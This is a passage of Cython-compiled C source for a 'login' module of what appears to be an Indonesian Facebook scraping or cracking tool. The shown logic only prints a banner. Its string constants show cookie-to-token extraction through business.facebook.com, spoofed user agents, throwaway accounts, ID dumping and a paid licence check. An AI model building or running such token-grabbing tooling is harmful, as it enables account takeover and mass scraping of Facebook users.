static PyObject *__pyx_kp_u_09;
static PyObject *__pyx_kp_u_0m;
static PyObject *__pyx_kp_u_1;
static PyObject *__pyx_kp_u_10;
static PyObject *__pyx_kp_u_11;
static PyObject *__pyx_kp_u_12;
static PyObject *__pyx_kp_u_1_2;
static PyObject *__pyx_kp_u_1_91m;
static PyObject *__pyx_kp_u_1_92m;
static PyObject *__pyx_kp_u_1_93m;
static PyObject *__pyx_kp_u_1_94m;
static PyObject *__pyx_kp_u_1_95m;
static PyObject *__pyx_kp_u_1_96m;
static PyObject *__pyx_kp_u_1_97m;
static PyObject *__pyx_kp_u_2;
static PyObject *__pyx_kp_u_3;
static PyObject *__pyx_kp_u_4;
static PyObject *__pyx_kp_u_5;
static PyObject *__pyx_kp_u_6;
static PyObject *__pyx_kp_u_7;
static PyObject *__pyx_kp_u_8;
static PyObject *__pyx_kp_u_9;
static PyObject *__pyx_n_u_Agustus;
static PyObject *__pyx_kp_u_Anda_bisa_mengambil_cookie_denga;
static PyObject *__pyx_kp_u_Anda_bisa_mengambil_token_dengan;
static PyObject *__pyx_n_s_ApiKey;
static PyObject *__pyx_n_u_April;
static PyObject *__pyx_n_s_AttributeError;
static PyObject *__pyx_n_s_B;
static PyObject *__pyx_n_s_BeautifulSoup;
static PyObject *__pyx_n_u_COOKIE;
static PyObject *__pyx_n_s_ConnectionError;
static PyObject *__pyx_n_u_December;
static PyObject *__pyx_n_u_Desember;
static PyObject *__pyx_kp_u_Device_Terpakai;
static PyObject *__pyx_n_s_Dump;
static PyObject *__pyx_n_u_EAA;
static PyObject *__pyx_kp_u_EAAG_w;
static PyObject *__pyx_kp_u_EAA_w;
static PyObject *__pyx_kp_u_Email_Apikey;
static PyObject *__pyx_n_u_Februari;
static PyObject *__pyx_n_u_February;
static PyObject *__pyx_n_s_FileNotFoundError;
static PyObject *__pyx_n_u_Friday;
static PyObject *__pyx_n_s_H;
static PyObject *__pyx_n_u_Host;
static PyObject *__pyx_n_u_INFO;
static PyObject *__pyx_n_s_IP;
static PyObject *__pyx_n_u_Januari;
static PyObject *__pyx_n_u_January;
static PyObject *__pyx_n_u_Juli;
static PyObject *__pyx_n_u_July;
static PyObject *__pyx_n_u_Jumat;
static PyObject *__pyx_n_u_June;
static PyObject *__pyx_n_u_Juni;
static PyObject *__pyx_n_s_K;
static PyObject *__pyx_n_u_Kamis;
static PyObject *__pyx_n_s_KeyError;
static PyObject *__pyx_n_s_M;
static PyObject *__pyx_n_u_March;
static PyObject *__pyx_n_u_Maret;
static PyObject *__pyx_kp_u_Masukan_Email;
static PyObject *__pyx_kp_u_Masukan_Sandi;
static PyObject *__pyx_n_u_May;
static PyObject *__pyx_n_u_Mei;
static PyObject *__pyx_n_s_Menu;
static PyObject *__pyx_n_s_MenuLain;
static PyObject *__pyx_n_u_Minggu;
static PyObject *__pyx_n_u_Monday;
static PyObject *__pyx_kp_u_Mozilla_5_0_Linux_Android_12_SAM;
static PyObject *__pyx_kp_u_Mozilla_5_0_Linux_Android_6_0_1;
static PyObject *__pyx_kp_u_Mozilla_5_0_Linux_Android_8_1_0;
static PyObject *__pyx_n_s_N;
static PyObject *__pyx_kp_u_Nama_Apikey;
static PyObject *__pyx_kp_u_NokiaC3_00_5_0_08_63_Profile_MID;
static PyObject *__pyx_n_u_November;
static PyObject *__pyx_n_s_O;
static PyObject *__pyx_n_u_October;
static PyObject *__pyx_n_u_Oktober;
static PyObject *__pyx_n_s_P;
static PyObject *__pyx_n_s_Panel;
static PyObject *__pyx_kp_u_Pilih;
static PyObject *__pyx_kp_u_Pilih_Nomer_Token_Untuk_Login;
static PyObject *__pyx_n_u_Rabu;
static PyObject *__pyx_n_u_Sabtu;
static PyObject *__pyx_kp_u_Sampai;
static PyObject *__pyx_n_u_Saturday;
static PyObject *__pyx_n_u_Selasa;
static PyObject *__pyx_n_u_Senin;
static PyObject *__pyx_n_u_September;
static PyObject *__pyx_n_s_Session;
static PyObject *__pyx_kp_u_Silahkan_masukkan_email_no_hp_id;
static PyObject *__pyx_kp_u_Sisa_Waktu_Apikey;
static PyObject *__pyx_n_u_Sunday;
static PyObject *__pyx_n_u_TOKEN;
static PyObject *__pyx_kp_u_Tgl_Bergabung;
static PyObject *__pyx_kp_u_Tgl_Kadaluwarsa;
static PyObject *__pyx_n_u_Thursday;
static PyObject *__pyx_n_s_Tree;
static PyObject *__pyx_n_u_Tuesday;
static PyObject *__pyx_n_s_U;
static PyObject *__pyx_n_s_ValueError;
static PyObject *__pyx_n_s_WAR;
static PyObject *__pyx_n_u_Wednesday;
static PyObject *__pyx_n_u_Y;
static PyObject *__pyx_kp_u__16;
static PyObject *__pyx_kp_u__22;
static PyObject *__pyx_kp_u__23;
static PyObject *__pyx_kp_u__4;
static PyObject *__pyx_kp_u__5;
static PyObject *__pyx_n_s_a;
static PyObject *__pyx_n_u_accept;
static PyObject *__pyx_kp_u_accept_encoding;
static PyObject *__pyx_kp_u_accept_language;
static PyObject *__pyx_n_u_agustus;
static PyObject *__pyx_n_s_allow_redirects;
static PyObject *__pyx_kp_u_apakah_kamu_ingin_menghapus_api;
static PyObject *__pyx_n_s_apikey;
static PyObject *__pyx_n_s_append;
static PyObject *__pyx_kp_u_application_x_www_form_urlencode;
static PyObject *__pyx_n_u_april;
static PyObject *__pyx_n_u_august;
static PyObject *__pyx_n_s_b;
static PyObject *__pyx_n_s_bergabung;
static PyObject *__pyx_kp_u_berhasil_menghapus_apikey;
static PyObject *__pyx_kp_u_blue;
static PyObject *__pyx_kp_u_bold;
static PyObject *__pyx_kp_u_bold_01_Login_Dengan_Token_06_B;
static PyObject *__pyx_kp_u_bold_DATA_APIKEY;
static PyObject *__pyx_kp_u_bold_MENU_LOGIN;
static PyObject *__pyx_kp_u_bold_Status_Apikey;
static PyObject *__pyx_kp_u_bold_green;
static PyObject *__pyx_kp_u_bold_red_Akun_tumbal_terkena_ch;
static PyObject *__pyx_kp_u_bold_red_Cookie_invalid_atau_ti;
static PyObject *__pyx_kp_u_bold_red_Email_atau_kata_sandi;
static PyObject *__pyx_kp_u_bold_red_Maaf_lisensi_anda_tida;
static PyObject *__pyx_kp_u_bold_red_Token_invalid_atau_tid;
static PyObject *__pyx_kp_u_bold_white;
static PyObject *__pyx_kp_u_bold_white_Author_Fall_Xavier_V;
static PyObject *__pyx_kp_u_bold_white_Selamat_Datang_bold;
static PyObject *__pyx_kp_u_bold_white_User_Premium;
static PyObject *__pyx_n_s_bs4;
static PyObject *__pyx_n_s_bu;
static PyObject *__pyx_n_s_bulan;
static PyObject *__pyx_n_s_bulan_balik;
static PyObject *__pyx_n_s_bulan_ttl;
static PyObject *__pyx_n_s_bulan_x;
static PyObject *__pyx_kp_u_business_facebook_com;
static PyObject *__pyx_n_u_c_user;
static PyObject *__pyx_kp_u_c_user_2;
static PyObject *__pyx_kp_u_cache_control;
static PyObject *__pyx_n_s_calendar;
static PyObject *__pyx_n_s_cek_hasil;
static PyObject *__pyx_n_s_cek_opsi;
static PyObject *__pyx_n_s_ceklisen;
static PyObject *__pyx_n_u_checkpoint;
static PyObject *__pyx_n_s_choice;
static PyObject *__pyx_n_u_chrome;
static PyObject *__pyx_n_u_clear;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_cok;
static PyObject *__pyx_kp_u_content_type;
static PyObject *__pyx_n_s_convert;
static PyObject *__pyx_n_s_cookie;
static PyObject *__pyx_n_u_cookie;
static PyObject *__pyx_n_s_cookies;
static PyObject *__pyx_n_u_cors;
static PyObject *__pyx_n_s_ct;
static PyObject *__pyx_n_s_current;
static PyObject *__pyx_n_s_cv_hr;
static PyObject *__pyx_kp_u_cyan;
static PyObject *__pyx_kp_u_d_m_Y;
static PyObject *__pyx_n_s_das;
static PyObject *__pyx_n_s_data;
static PyObject *__pyx_n_s_data2;
static PyObject *__pyx_kp_u_data_apikey_txt;
static PyObject *__pyx_kp_u_data_cookie_txt;
static PyObject *__pyx_kp_u_data_token_txt;
static PyObject *__pyx_n_s_datawaktu;
static PyObject *__pyx_n_s_date;
static PyObject *__pyx_n_s_date_format;
static PyObject *__pyx_n_s_datetime;
static PyObject *__pyx_kp_u_datr;
static PyObject *__pyx_n_u_datr_2;
static PyObject *__pyx_n_s_day;
static PyObject *__pyx_n_s_day_name;
static PyObject *__pyx_n_s_days;
static PyObject *__pyx_n_u_december;
static PyObject *__pyx_kp_u_deep_pink3;
static PyObject *__pyx_n_s_delta;
static PyObject *__pyx_n_u_desember;
static PyObject *__pyx_kp_u_dev;
static PyObject *__pyx_n_s_device;
static PyObject *__pyx_kp_u_device_Alamat_IP;
static PyObject *__pyx_n_u_dnt;
static PyObject *__pyx_n_u_document;
static PyObject *__pyx_n_s_dump;
static PyObject *__pyx_n_s_e;
static PyObject *__pyx_n_s_email;
static PyObject *__pyx_n_u_email;
static PyObject *__pyx_n_u_empty;
static PyObject *__pyx_kp_u_en_GB_en_US_q_0_9_en_q_0_8;
static PyObject *__pyx_n_s_exceptions;
static PyObject *__pyx_n_s_exit;
static PyObject *__pyx_n_s_exp;
static PyObject *__pyx_n_u_expired;
static PyObject *__pyx_n_u_february;
static PyObject *__pyx_n_s_find_token;
static PyObject *__pyx_n_s_findall;
static PyObject *__pyx_n_u_flow;
static PyObject *__pyx_kp_u_fr;
static PyObject *__pyx_n_u_fr_2;
static PyObject *__pyx_n_s_freetoken;
static PyObject *__pyx_n_s_freetokenv1;
static PyObject *__pyx_n_s_freetokenv2;
static PyObject *__pyx_n_s_garis;
static PyObject *__pyx_n_s_get;
static PyObject *__pyx_n_s_get_cookie;
static PyObject *__pyx_n_s_get_dict;
static PyObject *__pyx_n_s_get_token;
static PyObject *__pyx_kp_u_green;
static PyObject *__pyx_n_s_group;
static PyObject *__pyx_n_s_grup_tanpalogin;
static PyObject *__pyx_kp_u_gzip_deflate;
static PyObject *__pyx_kp_u_gzip_deflate_br;
static PyObject *__pyx_n_s_ha;
static PyObject *__pyx_n_s_headcok;
static PyObject *__pyx_n_s_header;
static PyObject *__pyx_n_s_header1;
static PyObject *__pyx_n_s_headers;
static PyObject *__pyx_n_u_host;
static PyObject *__pyx_n_s_hr;
static PyObject *__pyx_kp_u_html_parser;
static PyObject *__pyx_kp_u_http_ip_api_com_json;
static PyObject *__pyx_kp_u_https;
static PyObject *__pyx_kp_u_https_business_facebook_com;
static PyObject *__pyx_kp_u_https_business_facebook_com_busi;
static PyObject *__pyx_kp_u_https_developers_facebook_com_to;
static PyObject *__pyx_kp_u_https_fall_xavier_my_id_check_ph;
static PyObject *__pyx_kp_u_https_free_facebook_com_10004070;
static PyObject *__pyx_kp_u_https_graph_facebook_com_me_acce;
static PyObject *__pyx_kp_u_https_graph_facebook_com_me_acce_2;
static PyObject *__pyx_kp_u_https_m_facebook_com;
static PyObject *__pyx_kp_u_https_m_facebook_com_index_php_n;
static PyObject *__pyx_kp_u_https_m_facebook_com_login_devic;
static PyObject *__pyx_kp_u_https_www_facebook_com;
static PyObject *__pyx_kp_u_id_ID_id_q_0_9_en_US_q_0_8_en_q;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_input;
static PyObject *__pyx_n_u_januari;
static PyObject *__pyx_n_u_january;
static PyObject *__pyx_n_u_jazoest;
static PyObject *__pyx_n_u_join;
static PyObject *__pyx_n_s_json;
static PyObject *__pyx_n_u_juli;
static PyObject *__pyx_n_u_july;
static PyObject *__pyx_n_u_june;
static PyObject *__pyx_n_u_juni;
static PyObject *__pyx_n_u_kadaluarsa;
static PyObject *__pyx_n_s_kadaluwarsa;
static PyObject *__pyx_n_s_kredensial;
static PyObject *__pyx_kp_u_limit_device;
static PyObject *__pyx_n_s_login;
static PyObject *__pyx_n_u_login_no_pin;
static PyObject *__pyx_kp_s_login_py;
static PyObject *__pyx_n_s_logo;
static PyObject *__pyx_n_u_lsd;
static PyObject *__pyx_kp_u_m_facebook_com;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_u_march;
static PyObject *__pyx_kp_u_mark_via_gp;
static PyObject *__pyx_kp_u_masukan_cookie_fb;
static PyObject *__pyx_kp_u_masukan_token_fb;
static PyObject *__pyx_kp_u_max_age_0;
static PyObject *__pyx_n_u_may;
static PyObject *__pyx_n_u_mei;
static PyObject *__pyx_n_s_menu;
static PyObject *__pyx_n_s_menu_apikey;
static PyObject *__pyx_n_s_menulain;
static PyObject *__pyx_n_s_month;
static PyObject *__pyx_n_s_my_date;
static PyObject *__pyx_n_s_n;
static PyObject *__pyx_n_s_nTemp;
static PyObject *__pyx_n_s_nama;
static PyObject *__pyx_n_u_nama;
static PyObject *__pyx_n_s_nama_hari;
static PyObject *__pyx_n_u_name;
static PyObject *__pyx_n_s_name_2;
static PyObject *__pyx_kp_u_name_jazoest_value;
static PyObject *__pyx_kp_u_name_lsd_value;
static PyObject *__pyx_n_u_next;
static PyObject *__pyx_n_u_november;
static PyObject *__pyx_n_s_now;
static PyObject *__pyx_n_s_num;
static PyObject *__pyx_n_u_october;
static PyObject *__pyx_n_u_oktober;
static PyObject *__pyx_n_s_op;
static PyObject *__pyx_n_s_open;
static PyObject *__pyx_n_u_origin;
static PyObject *__pyx_n_s_os;
static PyObject *__pyx_n_s_parser;
static PyObject *__pyx_n_u_pass;
static PyObject *__pyx_n_s_pencarian_nologin;
static PyObject *__pyx_n_s_pil;
static PyObject *__pyx_n_s_platform;
static PyObject *__pyx_n_s_po;
static PyObject *__pyx_n_s_post;
static PyObject *__pyx_n_s_print;
static PyObject *__pyx_n_s_prints;
static PyObject *__pyx_n_s_pw;
static PyObject *__pyx_n_u_query;
static PyObject *__pyx_n_s_r;
static PyObject *__pyx_n_u_r;
static PyObject *__pyx_n_s_random;
static PyObject *__pyx_n_s_re;
static PyObject *__pyx_n_s_read;
static PyObject *__pyx_n_u_readtext;
static PyObject *__pyx_n_s_real_time;
static PyObject *__pyx_kp_u_red;
static PyObject *__pyx_n_u_referer;
static PyObject *__pyx_n_s_remove;
static PyObject *__pyx_n_s_requests;
static PyObject *__pyx_n_s_rich;
static PyObject *__pyx_n_s_rich_panel;
static PyObject *__pyx_n_s_rich_tree;
static PyObject *__pyx_kp_u_rm_f_data_token_txt;
static PyObject *__pyx_kp_u_rm_f_data_token_txt_data_cookie;
static PyObject *__pyx_kp_u_s;
static PyObject *__pyx_kp_u_same_origin;
static PyObject *__pyx_n_s_search;
static PyObject *__pyx_kp_u_sec_fetch_dest;
static PyObject *__pyx_kp_u_sec_fetch_mode;
static PyObject *__pyx_kp_u_sec_fetch_site;
static PyObject *__pyx_kp_u_sec_fetch_user;
static PyObject *__pyx_n_u_september;
static PyObject *__pyx_n_s_ses;
static PyObject *__pyx_n_s_sisahari;
static PyObject *__pyx_n_s_sleep;
static PyObject *__pyx_n_s_split;
static PyObject *__pyx_n_s_src;
static PyObject *__pyx_n_s_status;
static PyObject *__pyx_n_u_status;
static PyObject *__pyx_n_s_strptime;
static PyObject *__pyx_n_s_sys;
static PyObject *__pyx_n_s_system;
static PyObject *__pyx_n_s_ta;
static PyObject *__pyx_n_s_tanggal;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_s_text;
static PyObject *__pyx_kp_u_text_html_application_xhtml_xml;
static PyObject *__pyx_kp_u_text_html_application_xhtml_xml_2;
static PyObject *__pyx_kp_u_text_html_charset_utf_8;
static PyObject *__pyx_n_s_tgl;
static PyObject *__pyx_kp_u_tidak_ada_koneksi_internet;
static PyObject *__pyx_n_s_time;
static PyObject *__pyx_n_s_title;
static PyObject *__pyx_n_s_today;
static PyObject *__pyx_n_s_token;
static PyObject *__pyx_n_s_tolkau;
static PyObject *__pyx_n_u_uid;
static PyObject *__pyx_kp_u_upgrade_insecure_requests;
static PyObject *__pyx_n_s_url;
static PyObject *__pyx_n_u_usage;
static PyObject *__pyx_n_s_user;
static PyObject *__pyx_kp_u_user_agent;
static PyObject *__pyx_n_u_w;
static PyObject *__pyx_n_s_weekday;
static PyObject *__pyx_n_s_write;
static PyObject *__pyx_kp_u_x_requested_with;
static PyObject *__pyx_kp_u_xs;
static PyObject *__pyx_n_u_xs_2;
static PyObject *__pyx_n_u_y;
static PyObject *__pyx_n_s_year;
static PyObject *__pyx_n_s_zz;
static PyObject *__pyx_pf_5login_logo(CYTHON_UNUSED PyObject *__pyx_self); 
static PyObject *__pyx_pf_5login_2datawaktu(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_exp); 
static PyObject *__pyx_pf_5login_4ceklisen(CYTHON_UNUSED PyObject *__pyx_self); 
static PyObject *__pyx_pf_5login_6login(CYTHON_UNUSED PyObject *__pyx_self); 
static PyObject *__pyx_pf_5login_8get_token(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_token); 
static PyObject *__pyx_pf_5login_10get_cookie(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_cookie); 
static PyObject *__pyx_pf_5login_12freetokenv1(CYTHON_UNUSED PyObject *__pyx_self); 
static PyObject *__pyx_pf_5login_14freetokenv2(CYTHON_UNUSED PyObject *__pyx_self); 
static PyObject *__pyx_pf_5login_16kredensial(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_user, PyObject *__pyx_v_pw); 
static PyObject *__pyx_pf_5login_18convert(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_cok); 
static PyObject *__pyx_pf_5login_20real_time(CYTHON_UNUSED PyObject *__pyx_self); 
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_1;
static PyObject *__pyx_int_3;
static PyObject *__pyx_int_5;
static PyObject *__pyx_int_12;
static PyObject *__pyx_tuple__2;
static PyObject *__pyx_tuple__3;
static PyObject *__pyx_tuple__6;
static PyObject *__pyx_tuple__7;
static PyObject *__pyx_tuple__8;
static PyObject *__pyx_tuple__9;
static PyObject *__pyx_tuple__10;
static PyObject *__pyx_tuple__11;
static PyObject *__pyx_tuple__12;
static PyObject *__pyx_tuple__13;
static PyObject *__pyx_tuple__14;
static PyObject *__pyx_tuple__15;
static PyObject *__pyx_tuple__17;
static PyObject *__pyx_tuple__18;
static PyObject *__pyx_tuple__19;
static PyObject *__pyx_tuple__20;
static PyObject *__pyx_tuple__21;
static PyObject *__pyx_tuple__24;
static PyObject *__pyx_tuple__25;
static PyObject *__pyx_tuple__26;
static PyObject *__pyx_tuple__28;
static PyObject *__pyx_tuple__30;
static PyObject *__pyx_tuple__32;
static PyObject *__pyx_tuple__34;
static PyObject *__pyx_tuple__36;
static PyObject *__pyx_tuple__38;
static PyObject *__pyx_tuple__40;
static PyObject *__pyx_tuple__42;
static PyObject *__pyx_tuple__44;
static PyObject *__pyx_tuple__46;
static PyObject *__pyx_codeobj__27;
static PyObject *__pyx_codeobj__29;
static PyObject *__pyx_codeobj__31;
static PyObject *__pyx_codeobj__33;
static PyObject *__pyx_codeobj__35;
static PyObject *__pyx_codeobj__37;
static PyObject *__pyx_codeobj__39;
static PyObject *__pyx_codeobj__41;
static PyObject *__pyx_codeobj__43;
static PyObject *__pyx_codeobj__45;
static PyObject *__pyx_codeobj__47;





static PyObject *__pyx_pw_5login_1logo(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); 
static PyMethodDef __pyx_mdef_5login_1logo = {"logo", (PyCFunction)__pyx_pw_5login_1logo, METH_NOARGS, 0};
static PyObject *__pyx_pw_5login_1logo(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("logo (wrapper)", 0);
  __pyx_r = __pyx_pf_5login_logo(__pyx_self);

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5login_logo(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_WAR = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  Py_ssize_t __pyx_t_6;
  Py_UCS4 __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("logo", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_n_u_clear) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_u_clear);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_kp_u_deep_pink3);
  __Pyx_GIVEREF(__pyx_kp_u_deep_pink3);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_deep_pink3);
  __Pyx_INCREF(__pyx_kp_u_red);
  __Pyx_GIVEREF(__pyx_kp_u_red);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_kp_u_red);
  __Pyx_INCREF(__pyx_kp_u_green);
  __Pyx_GIVEREF(__pyx_kp_u_green);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u_green);
  __Pyx_INCREF(__pyx_kp_u_cyan);
  __Pyx_GIVEREF(__pyx_kp_u_cyan);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_kp_u_cyan);
  __Pyx_INCREF(__pyx_kp_u_blue);
  __Pyx_GIVEREF(__pyx_kp_u_blue);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_kp_u_blue);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_4, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_WAR = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_prints); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_Panel); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_bold);
  __pyx_t_6 += 6;
  __Pyx_GIVEREF(__pyx_kp_u_bold);
  PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_bold);
  __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_v_WAR, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_8);
  PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_8);
  __pyx_t_8 = 0;
  __Pyx_INCREF(__pyx_kp_u_bold_white_Author_Fall_Xavier_V);
  __pyx_t_7 = (65535 > __pyx_t_7) ? 65535 : __pyx_t_7;
  __pyx_t_6 += 376;
  __Pyx_GIVEREF(__pyx_kp_u_bold_white_Author_Fall_Xavier_V);
  PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_bold_white_Author_Fall_Xavier_V);
  __pyx_t_8 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_3 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_8);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_4, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_AddTraceback("login.logo", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_WAR);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_5login_3datawaktu(PyObject *__pyx_self, PyObject *__pyx_v_exp); 
